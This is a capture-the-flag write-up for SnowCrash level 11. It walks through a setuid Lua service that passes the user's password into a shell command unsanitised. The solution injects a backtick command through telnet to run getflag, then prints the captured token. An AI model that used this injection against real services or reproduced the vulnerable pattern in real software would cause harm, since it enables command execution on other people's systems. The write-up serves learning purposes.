## Level 11


## Clues


```
level11@SnowCrash:~$ ls -l
total 4
-rwsr-sr-x 1 flag11 level11 668 Mar  5  2016 level11.lua
level11@SnowCrash:~$
```


We have .lua file :
``` lua
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end


while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end

  end

  client:close()
end
```

Very interessting script let's explain it briefly :

It is using a socket library to make a socket connection, that listen on the port 5151

It ask for the user a password, and will hash it using the sha1.

Nothing interesting in this part beside the function hash(), it takes a password as a parameter and is used in the poen function as a parameter of echo.

This is clearly vulnerable ton an injection.

When we launch the script this happens :

```
lua: ./level11.lua:3: address already in use
stack traceback:
        [C]: in function 'assert'
        ./level11.lua:3: in main chunk
        [C]: ?
level11@SnowCrash:~
```
Normal, since the script is connecting 127.0.0.1:5151 We easily guess its already being runned by the flag11 user, so lets just log to it using telnet.

```
level11@SnowCrash:~$ telnet 127.0.0.1 5151
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is '^]'.
Password: hey bro
Erf nope..
Connection closed by foreign host.
level11@SnowCrash:~$
```

## Solution

Since we saw the injection vulnerability, lets exploit it.

```
level11@SnowCrash:~$ telnet 127.0.0.1 5151
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is '^]'.
Password: `getflag` > /tmp/flag
Erf nope..
Connection closed by foreign host.
level11@SnowCrash:~$ cat /tmp/flag
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
level11@SnowCrash:~$
```

Very simple flag beside the fact that there is a lot of details in this level.

## What i learned

More attention to vulnerabilty

More curiosity